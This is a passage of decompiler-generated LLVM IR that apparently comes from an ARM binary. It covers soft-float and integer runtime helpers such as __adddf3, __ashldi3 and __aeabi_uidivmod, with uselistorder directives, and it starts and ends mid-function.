  store i32 %v6_162d8, i32* %r0.global-to-local, align 4
  ret i32 %v6_162d8

dec_label_pc_162e0:                               ; preds = %entry
  %v0_162e4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_162d4, { 1, 0 }
  uselistorder i1 %v7_162cc, { 1, 0 }
  uselistorder i32 %v4_162c4, { 1, 0 }
  uselistorder i32 %v1_162c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_162bc, { 1, 0 }
  uselistorder i32 %v4_162b8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_162b8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_162a8, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_16280, { 1, 0 }
  uselistorder i32 %v0_16290, { 1, 0, 2 }
  uselistorder i32 %v4_16274, { 1, 0 }
  uselistorder i32 %v1_1627c, { 1, 2, 0 }
  uselistorder i32 %v4_16268, { 1, 0 }
  uselistorder i32 %v1_16270, { 1, 2, 0 }
  uselistorder i32 %v4_1625c, { 1, 0 }
  uselistorder i32 %v1_16264, { 1, 2, 0 }
  uselistorder i32 %v1_16288, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_16258, { 1, 0 }
  uselistorder i32 %v1_16284, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_16244, { 1, 0 }
  uselistorder i32 %v3_16240, { 1, 0 }
  uselistorder i32 %v1_16240, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_16244, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16230, { 1, 0 }
  uselistorder i32 %v4_1622c, { 2, 1, 0 }
  uselistorder i32 %v1_16230, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_16238.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_16204, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_16204, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_161f8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_16290, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1624c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16238thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_162f8 = udiv i32 %arg1, %arg2
  ret i32 %v2_162f8
}

define i32 @__ashldi3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1630c = add i32 %arg3, -32
  %v6_1630c = icmp slt i32 %v1_1630c, 0
  br i1 %v6_1630c, label %.thread1, label %.thread

.thread:                                          ; preds = %entry
  br label %bb

.thread1:                                         ; preds = %entry
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v6_16320 = shl i32 %arg1, %arg3
  ret i32 %v6_16320

; uselistorder directives
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1632c = bitcast i64 %tmp to double
  %v9_1632c = fadd double %v8_1632c, %arg1
  %v10_1632c = fptrunc double %v9_1632c to float
  %v11_1632c = bitcast float %v10_1632c to i32
  ret i32 %v11_1632c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_16330 = load i32, i32* @r0, align 4
  ret i32 %v2_16330
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16334 = load i32, i32* @r4, align 4
  store i32 %v3_16334, i32* %stack_var_-12, align 4
  %v6_16334 = load i32, i32* @r5, align 4
  %v9_16334 = load i32, i32* @lr, align 4
  %v0_16338 = load i32, i32* %r1.global-to-local, align 4
  %v2_16338 = mul i32 %v0_16338, 2
  store i32 %v2_16338, i32* %r4.global-to-local, align 4
  %v0_1633c = load i32, i32* %r3.global-to-local, align 4
  %v2_1633c = mul i32 %v0_1633c, 2
  store i32 %v2_1633c, i32* %r5.global-to-local, align 4
  %v4_16340 = icmp eq i32 %v2_1633c, %v2_16338
  %v1_16344 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_16340, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_16344 = load i32, i32* %r2.global-to-local, align 4
  %v5_16344 = icmp eq i32 %v2_16344, %v1_16344
  br i1 %v5_16344, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_16348 = or i32 %v1_16344, %v2_16338
  %v5_16348 = icmp eq i32 %v3_16348, 0
  br i1 %v5_16348, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1634c = load i32, i32* %r2.global-to-local, align 4
  %v3_1634c = or i32 %v2_1634c, %v2_1633c
  %v5_1634c = icmp eq i32 %v3_1634c, 0
  br i1 %v5_1634c, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_16338.off = add i32 %v2_16338, 4194303
  %tmp = icmp ult i32 %v2_16338.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1633c.off = add i32 %v2_1633c, 4194303
  %tmp17 = icmp ult i32 %v2_1633c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_16358 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_16358, i32 ptrtoint (i32* @global_var_16590.734 to i32))
  %v0_1635c = load i32, i32* %r4.global-to-local, align 4
  %v3_1635c = udiv i32 %v0_1635c, 2097152
  store i32 %v3_1635c, i32* %r4.global-to-local, align 4
  %v1_16360 = load i32, i32* %r5.global-to-local, align 4
  %v4_16360 = udiv i32 %v1_16360, 2097152
  %v5_16360 = sub nsw i32 %v4_16360, %v3_1635c
  %v5_16364 = icmp ult i32 %v4_16360, %v3_1635c
  br i1 %v5_16364, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_16364 = sub nsw i32 0, %v5_16360
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_16364, %bb13 ], [ %v5_16360, %.thread3 ]
  %v0_16388 = phi i32 [ %v7_16364, %bb13 ], [ %v5_16360, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_16368 = icmp ugt i32 %v4_16360, %v3_1635c
  br i1 %v7_16368, label %dec_label_pc_1636c, label %dec_label_pc_16388

dec_label_pc_1636c:                               ; preds = %bb14
  %v2_1636c = add nsw i32 %v0_16388, %v3_1635c
  store i32 %v2_1636c, i32* %r4.global-to-local, align 4
  %v0_16370 = load i32, i32* %r0.global-to-local, align 4
  %v1_16370 = load i32, i32* %r2.global-to-local, align 4
  %v0_16374 = load i32, i32* %r1.global-to-local, align 4
  %v1_16374 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_16370, i32* %r0.global-to-local, align 4
  store i32 %v1_16374, i32* %r1.global-to-local, align 4
  store i32 %v0_16370, i32* %r2.global-to-local, align 4
  store i32 %v0_16374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16388

dec_label_pc_16388:                               ; preds = %bb14, %dec_label_pc_1636c
  %tmp18 = icmp ugt i32 %v0_16388, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_16388
  %v6_1638c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1638c, i32* %r4.global-to-local, align 4
  store i32 %v6_16334, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16388, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_16334)
  %v0_16394 = load i32, i32* %r1.global-to-local, align 4
  %v3_16394 = icmp sgt i32 %v0_16394, -1
  %v4_163a0 = urem i32 %v0_16394, 1048576
  %v5_163a0 = or i32 %v4_163a0, 1048576
  store i32 %v5_163a0, i32* %r1.global-to-local, align 4
  br i1 %v3_16394, label %dec_label_pc_163b0, label %dec_label_pc_163a8

dec_label_pc_163a8:                               ; preds = %bb16
  %v0_163a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_163a8 = sub i32 0, %v0_163a8
  store i32 %v1_163a8, i32* %r0.global-to-local, align 4
  %v2_163a8 = icmp eq i32 %v0_163a8, 0
  %v2_163ac = icmp eq i1 %v2_163a8, false
  %v5_163ac = sext i1 %v2_163ac to i32
  %v6_163ac = sub nsw i32 %v5_163ac, %v5_163a0
  store i32 %v6_163ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_163b0

dec_label_pc_163b0:                               ; preds = %bb16, %dec_label_pc_163a8
  %v0_163b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_163b0 = icmp sgt i32 %v0_163b0, -1
  %v4_163b8 = urem i32 %v0_163b0, 1048576
  %v5_163b8 = or i32 %v4_163b8, 1048576
  store i32 %v5_163b8, i32* %r3.global-to-local, align 4
  br i1 %v3_163b0, label %dec_label_pc_163c8, label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %dec_label_pc_163b0
  %v0_163c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_163c0 = sub i32 0, %v0_163c0
  store i32 %v1_163c0, i32* %r2.global-to-local, align 4
  %v2_163c0 = icmp eq i32 %v0_163c0, 0
  %v2_163c4 = icmp eq i1 %v2_163c0, false
  %v5_163c4 = sext i1 %v2_163c4 to i32
  %v6_163c4 = sub nsw i32 %v5_163c4, %v5_163b8
  store i32 %v6_163c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163c8

dec_label_pc_163c8:                               ; preds = %dec_label_pc_163b0, %dec_label_pc_163c0
  %v0_163c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_163c8 = load i32, i32* %r5.global-to-local, align 4
  %v4_163c8 = icmp eq i32 %v1_163c8, %v0_163c8
  call void @__pseudo_cond_branch(i1 %v4_163c8, i32 ptrtoint (i32* @global_var_16578.735 to i32))
  %v1_163cc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_163cc

; uselistorder directives
  uselistorder i32 %v0_163b0, { 1, 0 }
  uselistorder i32 %v0_16394, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_16360, { 2, 1, 0 }
  uselistorder i32 %v3_1635c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_16344, { 1, 0 }
  uselistorder i32 %v2_1633c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_16338, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_163c8, { 1, 0 }
  uselistorder label %dec_label_pc_163b0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_16388, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_163d0() local_unnamed_addr {
dec_label_pc_163d0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_163d0 = load i32, i32* @r4, align 4
  %v1_163d0 = add i32 %v0_163d0, -1
  store i32 %v1_163d0, i32* @r4, align 4
  %v0_163d4 = load i32, i32* @r5, align 4
  %v1_163d4 = sub i32 32, %v0_163d4
  store i32 %v1_163d4, i32* @lr, align 4
  %v5_163d8 = icmp sgt i32 %v0_163d4, 32
  br i1 %v5_163d8, label %dec_label_pc_163f4, label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %dec_label_pc_163d0
  %v0_163dc = load i32, i32* @r2, align 4
  %v6_163dc = shl i32 %v0_163dc, %v1_163d4
  store i32 %v6_163dc, i32* %ip.global-to-local, align 4
  %v0_163e0 = load i32, i32* @r0, align 4
  %v3_163e0 = add i32 %v0_163d4, -1
  %v4_163e0 = shl i32 1, %v3_163e0
  %v7_163e0 = lshr i32 %v0_163dc, %v0_163d4
  %v8_163e0 = add i32 %v0_163e0, %v7_163e0
  %v9_163e0 = icmp ult i32 %v8_163e0, %v0_163e0
  %v0_163e4 = load i32, i32* @r1, align 4
  %v2_163e4 = zext i1 %v9_163e0 to i32
  %v3_163e4 = add i32 %v2_163e4, %v0_163e4
  %v1_163e8 = load i32, i32* @r3, align 4
  %v7_163e8 = shl i32 %v1_163e8, %v1_163d4
  %v8_163e8 = add i32 %v7_163e8, %v8_163e0
  store i32 %v8_163e8, i32* %r0.global-to-local, align 4
  %v5_163ec = and i32 %v1_163e8, %v4_163e0
  %v6_163ec = icmp ne i32 %v5_163ec, 0
  %v7_163ec = ashr i32 %v1_163e8, %v0_163d4
  %v9_163ec = add i32 %v3_163e4, %v7_163ec
  %v10_163ec = zext i1 %v6_163ec to i32
  %v11_163ec = add i32 %v10_163ec, %v9_163ec
  br label %dec_label_pc_16410

dec_label_pc_163f4:                               ; preds = %dec_label_pc_163d0
  %v1_163f4 = add i32 %v0_163d4, -32
  %v1_163f8 = add i32 %v1_163d4, 32
  store i32 %v1_163f8, i32* @lr, align 4
  %v0_16400 = load i32, i32* @r3, align 4
  %v2_16400 = add i32 %v1_163d4, 31
  %v3_16400 = lshr i32 -2147483648, %v2_16400
  %v4_16400 = and i32 %v0_16400, %v3_16400
  %v5_16400 = icmp ne i32 %v4_16400, 0
  %v6_16400 = shl i32 %v0_16400, %v1_163f8
  %v2_16404 = or i32 %v6_16400, 2
  %v2_16404.v6_16400 = select i1 %v5_16400, i32 %v2_16404, i32 %v6_16400
  store i32 %v2_16404.v6_16400, i32* %ip.global-to-local, align 4
  %v0_16408 = load i32, i32* @r0, align 4
  %v7_16408 = ashr i32 %v0_16400, %v1_163f4
  %v8_16408 = add i32 %v0_16408, %v7_16408
  store i32 %v8_16408, i32* %r0.global-to-local, align 4
  %v0_1640c = load i32, i32* @r1, align 4
  %v2_1640c = and i32 %v0_16400, 1073741824
  %v3_1640c = icmp ne i32 %v2_1640c, 0
  %v4_1640c = ashr i32 %v0_16400, 31
  %v6_1640c = add i32 %v0_1640c, %v4_1640c
  %v7_1640c = zext i1 %v3_1640c to i32
  %v8_1640c = add i32 %v6_1640c, %v7_1640c
  br label %dec_label_pc_16410

dec_label_pc_16410:                               ; preds = %dec_label_pc_163dc, %dec_label_pc_163f4
  %storemerge = phi i32 [ %v11_163ec, %dec_label_pc_163dc ], [ %v8_1640c, %dec_label_pc_163f4 ]
  %v0_16410 = phi i32 [ %v11_163ec, %dec_label_pc_163dc ], [ %v8_1640c, %dec_label_pc_163f4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_16410 = and i32 %v0_16410, -2147483648
  store i32 %v1_16410, i32* @r5, align 4
  %v1_16414 = icmp sgt i32 %v0_16410, -1
  call void @__pseudo_cond_branch(i1 %v1_16414, i32 ptrtoint (i32* @global_var_16424.736 to i32))
  %v0_16418 = load i32, i32* %ip.global-to-local, align 4
  %v1_16418 = sub i32 0, %v0_16418
  store i32 %v1_16418, i32* %ip.global-to-local, align 4
  %v2_16418 = icmp eq i32 %v0_16418, 0
  %v0_1641c = load i32, i32* %r0.global-to-local, align 4
  %v2_1641c = icmp eq i1 %v2_16418, false
  %v5_1641c = sext i1 %v2_1641c to i32
  %v6_1641c = sub i32 %v5_1641c, %v0_1641c
  store i32 %v6_1641c, i32* %r0.global-to-local, align 4
  %v7_1641c = zext i1 %v2_1641c to i32
  %v8_1641c = icmp ne i32 %v6_1641c, %v7_1641c
  %v9_1641c = icmp ne i32 %v0_1641c, -1
  %v10_1641c = or i1 %v9_1641c, %v8_1641c
  %v11_1641c = icmp ne i32 %v0_1641c, 0
  %v12_1641c = select i1 %v2_1641c, i1 %v10_1641c, i1 %v11_1641c
  %v0_16420 = load i32, i32* %r1.global-to-local, align 4
  %v5_16420 = sext i1 %v12_1641c to i32
  %v6_16420 = sub i32 %v5_16420, %v0_16420
  store i32 %v6_16420, i32* @r1, align 4
  ret i32 %v6_1641c

; uselistorder directives
  uselistorder i1 %v2_1641c, { 1, 2, 0 }
  uselistorder i32 %v0_1641c, { 1, 2, 0 }
  uselistorder i32 %v8_1640c, { 1, 0 }
  uselistorder i32 %v0_16400, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_163ec, { 1, 0 }
  uselistorder i32 %v1_163e8, { 1, 0, 2 }
  uselistorder i32 %v0_163e0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16410, { 1, 0 }
}

define i32 @function_16424(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16424:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_16424 = load i32, i32* %r1.global-to-local, align 4
  %v3_16428 = icmp ult i32 %v0_16424, 1048574
  br i1 %v3_16428, label %dec_label_pc_1646c, label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16424
  %v3_16430 = icmp ult i32 %v0_16424, 2097150
  br i1 %v3_16430, label %dec_label_pc_16450, label %dec_label_pc_16434

dec_label_pc_16434:                               ; preds = %dec_label_pc_1642c
  %v1_16434 = urem i32 %v0_16424, 2
  %v2_16434 = icmp ne i32 %v1_16434, 0
  %v3_16434 = udiv i32 %v0_16424, 2
  store i32 %v3_16434, i32* %r1.global-to-local, align 4
  %v0_16438 = load i32, i32* %r0.global-to-local, align 4
  %v3_16438 = zext i1 %v2_16434 to i32
  %v6_16438 = zext i32 %v0_16438 to i64
  %v7_16438 = sub i32 33, %v0_16438
  %v8_16438 = zext i32 %v7_16438 to i64
  %v9_16438 = shl i64 %v6_16438, %v8_16438
  %v10_16438 = sub i32 32, %v0_16438
  %v11_16438 = shl i32 %v3_16438, %v10_16438
  %v12_16438 = zext i32 %v11_16438 to i64
  %v14_16438 = or i64 %v12_16438, %v9_16438
  %v15_16438 = trunc i64 %v14_16438 to i32
  %v16_16438 = add i32 %v0_16438, -1
  %v17_16438 = shl i32 1, %v16_16438
  %v18_16438 = and i32 %v17_16438, %v0_16438
  %v19_16438 = icmp ne i32 %v18_16438, 0
  store i32 %v15_16438, i32* %r0.global-to-local, align 4
  %v0_1643c = load i32, i32* @ip, align 4
  %v3_1643c = zext i1 %v19_16438 to i32
  %v6_1643c = zext i32 %v0_1643c to i64
  %v7_1643c = sub i32 33, %v0_1643c
  %v8_1643c = zext i32 %v7_1643c to i64
  %v9_1643c = shl i64 %v6_1643c, %v8_1643c
  %v10_1643c = sub i32 32, %v0_1643c
  %v11_1643c = shl i32 %v3_1643c, %v10_1643c
  %v12_1643c = zext i32 %v11_1643c to i64
  %v14_1643c = or i64 %v12_1643c, %v9_1643c
  %v15_1643c = trunc i64 %v14_1643c to i32
  store i32 %v15_1643c, i32* @ip, align 4
  %v0_16440 = load i32, i32* @r4, align 4
  %v1_16440 = add i32 %v0_16440, 1
  store i32 %v1_16440, i32* @r4, align 4
  %v3_16444 = mul i32 %v1_16440, 2097152
  %v2_16448 = icmp ugt i32 %v3_16444, -4194305
  call void @__pseudo_cond_branch(i1 %v2_16448, i32 ptrtoint (i32* @global_var_16600.737 to i32))
  br label %dec_label_pc_16450

dec_label_pc_16450:                               ; preds = %dec_label_pc_1646c, %dec_label_pc_1642c, %dec_label_pc_16434
  %v0_16450 = load i32, i32* @ip, align 4
  %v2_16450 = icmp slt i32 %v0_16450, 0
  %v6_16450 = icmp eq i32 %v0_16450, -2147483648
  %v1_16454 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_16450, label %bb, label %dec_label_pc_16450._crit_edge

bb:                                               ; preds = %dec_label_pc_16450
  %v2_16454 = urem i32 %v1_16454, 2
  %v3_16454 = icmp ne i32 %v2_16454, 0
  br label %dec_label_pc_16450._crit_edge

dec_label_pc_16450._crit_edge:                    ; preds = %dec_label_pc_16450, %bb
  %v1_16458 = phi i1 [ %v3_16454, %bb ], [ %v2_16450, %dec_label_pc_16450 ]
  %v2_16458 = zext i1 %v1_16458 to i32
  %v3_16458 = add i32 %v2_16458, %v1_16454
  store i32 %v3_16458, i32* %r0.global-to-local, align 4
  %v0_1645c = load i32, i32* %r1.global-to-local, align 4
  %v1_1645c = load i32, i32* @r4, align 4
  %v2_1645c = and i32 %v1_1645c, 4096
  %v3_1645c = icmp ne i32 %v2_1645c, 0
  %v4_1645c = mul i32 %v1_1645c, 1048576
  %v6_1645c = add i32 %v4_1645c, %v0_1645c
  %v7_1645c = zext i1 %v3_1645c to i32
  %v8_1645c = add i32 %v7_1645c, %v6_1645c
  %v1_16460 = load i32, i32* @r5, align 4
  %v2_16460 = or i32 %v1_16460, %v8_1645c
  store i32 %v2_16460, i32* %r1.global-to-local, align 4
  ret i32 %v3_16458

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16424
  %v0_1646c = load i32, i32* @ip, align 4
  %v1_1646c = icmp slt i32 %v0_1646c, 0
  %v2_1646c = mul i32 %v0_1646c, 2
  store i32 %v2_1646c, i32* @ip, align 4
  %v0_16470 = load i32, i32* %r0.global-to-local, align 4
  %v3_16470 = mul i32 %v0_16470, 2
  %v4_16470 = zext i1 %v1_1646c to i32
  %v5_16470 = or i32 %v3_16470, %v4_16470
  store i32 %v5_16470, i32* %r0.global-to-local, align 4
  %v9_16470 = icmp ule i32 %v5_16470, %v0_16470
  %v10_16470 = icmp ult i32 %v3_16470, %v0_16470
  %v11_16470 = select i1 %v1_1646c, i1 %v9_16470, i1 %v10_16470
  %v3_16474 = mul i32 %v0_16424, 2
  %v4_16474 = zext i1 %v11_16470 to i32
  %v5_16474 = or i32 %v4_16474, %v3_16474
  store i32 %v5_16474, i32* %r1.global-to-local, align 4
  %v1_16478 = and i32 %v3_16474, 1048576
  %v2_16478 = icmp eq i32 %v1_16478, 0
  %v0_1647c = load i32, i32* @r4, align 4
  %v1_1647c = add i32 %v0_1647c, -1
  store i32 %v1_1647c, i32* @r4, align 4
  br i1 %v2_16478, label %bb7, label %dec_label_pc_16450

bb7:                                              ; preds = %dec_label_pc_1646c
  ret i32 %v5_16470

; uselistorder directives
  uselistorder i32 %v0_16470, { 1, 2, 0 }
  uselistorder i1 %v1_1646c, { 1, 0 }
  uselistorder i32 %v1_16454, { 1, 0 }
  uselistorder i32 %v0_16450, { 1, 0 }
  uselistorder i32 %v0_1643c, { 1, 0, 2 }
  uselistorder i32 %v0_16438, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 2097150, { 1, 0 }
  uselistorder label %dec_label_pc_16450._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16450, { 0, 2, 1 }
}

define i32 @function_16484() local_unnamed_addr {
dec_label_pc_16484:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_16484 = load i32, i32* @r1, align 4
  %v2_16484 = icmp eq i32 %v0_16484, 0
  br i1 %v2_16484, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_16484
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_16484
  %v1_1649010 = load i32, i32* @r0, align 4
  store i32 %v1_1649010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_164ec = phi i32 [ %v0_16484, %bb ], [ %v1_1649010, %bb38 ]
  %v1_164a4 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1649c = icmp ugt i32 %v0_164ec, 65535
  br i1 %v2_1649c, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_164a0 = and i32 %v0_164ec, 32768
  %v3_164a0 = icmp eq i32 %v2_164a0, 0
  %v4_164a0 = udiv i32 %v0_164ec, 65536
  br i1 %v3_164a0, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_164a4 = add nsw i32 %v1_164a4, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_164b0 = phi i32 [ %v1_164a4, %.thread ], [ %v1_164a4, %bb39 ], [ %v2_164a4, %bb40 ]
  %v1_164ac = phi i32 [ %v0_164ec, %.thread ], [ %v4_164a0, %bb39 ], [ %v4_164a0, %bb40 ]
  %v2_164a8 = icmp ugt i32 %v1_164ac, 255
  br i1 %v2_164a8, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_164ac = and i32 %v1_164ac, 128
  %v3_164ac = icmp eq i32 %v2_164ac, 0
  %v4_164ac = udiv i32 %v1_164ac, 256
  br i1 %v3_164ac, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_164b0 = add nsw i32 %v1_164b0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_164bc = phi i32 [ %v1_164b0, %.thread3 ], [ %v1_164b0, %bb41 ], [ %v2_164b0, %bb42 ]
  %v1_164b8 = phi i32 [ %v1_164ac, %.thread3 ], [ %v4_164ac, %bb41 ], [ %v4_164ac, %bb42 ]
  %v2_164b4 = icmp ugt i32 %v1_164b8, 15
  br i1 %v2_164b4, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_164b8 = and i32 %v1_164b8, 8
  %v3_164b8 = icmp eq i32 %v2_164b8, 0
  %v4_164b8 = udiv i32 %v1_164b8, 16
  br i1 %v3_164b8, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_164bc = add nsw i32 %v1_164bc, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_164c4 = phi i32 [ %v1_164bc, %.thread4 ], [ %v1_164bc, %bb43 ], [ %v2_164bc, %bb44 ]
  %v1_164cc = phi i32 [ %v1_164b8, %.thread4 ], [ %v4_164b8, %bb43 ], [ %v4_164b8, %bb44 ]
  %v2_164c0 = icmp ugt i32 %v1_164cc, 3
  br i1 %v2_164c0, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_164c4 = add i32 %v1_164c4, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_164c8 = udiv i32 %v1_164cc, 2
  %v6_164c8 = sub i32 %v1_164c4, %v5_164c8
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_164cc = phi i32 [ %v6_164c8, %.thread6 ], [ %v2_164c4, %bb45 ]
  %v4_164cc = udiv i32 %v1_164cc, 8
  %v5_164cc = sub i32 %v0_164cc, %v4_164cc
  %v2_164d0 = add i32 %v5_164cc, -32
  %v4_164d0 = sub i32 31, %v5_164cc
  %v5_164d0 = and i32 %v4_164d0, %v5_164cc
  %v8_164d0 = icmp eq i32 %v5_164cc, 32
  %v6_164d4 = icmp slt i32 %v5_164cc, 32
  br i1 %v6_164d4, label %dec_label_pc_164d8, label %dec_label_pc_164f8

dec_label_pc_164d8:                               ; preds = %bb46
  %v2_164d8 = add i32 %v5_164cc, -20
  %v7_164dc = icmp sgt i32 %v2_164d0, -12
  br i1 %v7_164dc, label %dec_label_pc_164e0, label %dec_label_pc_164f4

dec_label_pc_164e0:                               ; preds = %dec_label_pc_164d8
  %v1_164e4 = sub i32 32, %v5_164cc
  %v6_164e8 = shl i32 %v0_164ec, %v5_164cc
  store i32 %v6_164e8, i32* @r0, align 4
